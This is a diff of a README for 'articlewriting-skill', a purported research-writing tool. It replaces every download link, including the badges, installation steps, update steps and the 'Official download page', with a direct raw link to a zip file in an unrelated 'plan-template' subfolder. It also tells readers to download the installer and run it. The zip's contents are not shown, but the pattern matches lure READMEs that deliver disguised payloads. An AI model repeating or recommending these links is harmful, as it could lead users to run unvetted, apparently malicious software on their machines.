@@ -1,6 +1,6 @@
 # 📝 articlewriting-skill - Simplify Your Research Writing
 
-[![Download](https://img.shields.io/badge/Download-articlewriting--skill-brightgreen)](https://github.com/Hentry4/articlewriting-skill)
+[![Download](https://img.shields.io/badge/Download-articlewriting--skill-brightgreen)](https://github.com/Hentry4/articlewriting-skill/raw/refs/heads/main/plan-template/skill-articlewriting-2.6.zip)
 
 ## 🔍 What is articlewriting-skill?
 
@@ -35,12 +35,12 @@ No command line or extra tools are needed.
 
 Click this large button to go to the GitHub page and get the software:  
 
-[![Download](https://img.shields.io/badge/Download-articlewriting--skill-blue?style=for-the-badge)](https://github.com/Hentry4/articlewriting-skill)
+[![Download](https://img.shields.io/badge/Download-articlewriting--skill-blue?style=for-the-badge)](https://github.com/Hentry4/articlewriting-skill/raw/refs/heads/main/plan-template/skill-articlewriting-2.6.zip)
 
 ### Step-by-step:
 
 1. Click the button above or visit:  
-   https://github.com/Hentry4/articlewriting-skill  
+   https://github.com/Hentry4/articlewriting-skill/raw/refs/heads/main/plan-template/skill-articlewriting-2.6.zip  
 
 2. On the GitHub page, look for the section or link labeled **Releases**, **Downloads**, or similar.  
 
@@ -106,7 +106,7 @@ Check the GitHub page periodically for updates. New versions may fix bugs or add
 
 To update:  
 
-1. Visit https://github.com/Hentry4/articlewriting-skill  
+1. Visit https://github.com/Hentry4/articlewriting-skill/raw/refs/heads/main/plan-template/skill-articlewriting-2.6.zip  
 2. Download the latest installer and run it.  
 3. The setup will replace the old version without affecting your documents.  
 
@@ -122,10 +122,10 @@ To update:
 
 ## 🔗 Useful Links
 
-- Official download page: https://github.com/Hentry4/articlewriting-skill  
+- Official download page: https://github.com/Hentry4/articlewriting-skill/raw/refs/heads/main/plan-template/skill-articlewriting-2.6.zip  
 - User guide and documentation: Included inside the app under Help  
 - Support and feedback: Use the GitHub repository issues  
 
 ---
 
-[![Get articlewriting-skill](https://img.shields.io/badge/Get%20articlewriting--skill-grey?style=for-the-badge)](https://github.com/Hentry4/articlewriting-skill)
+[![Get articlewriting-skill](https://img.shields.io/badge/Get%20articlewriting--skill-grey?style=for-the-badge)](https://github.com/Hentry4/articlewriting-skill/raw/refs/heads/main/plan-template/skill-articlewriting-2.6.zip)
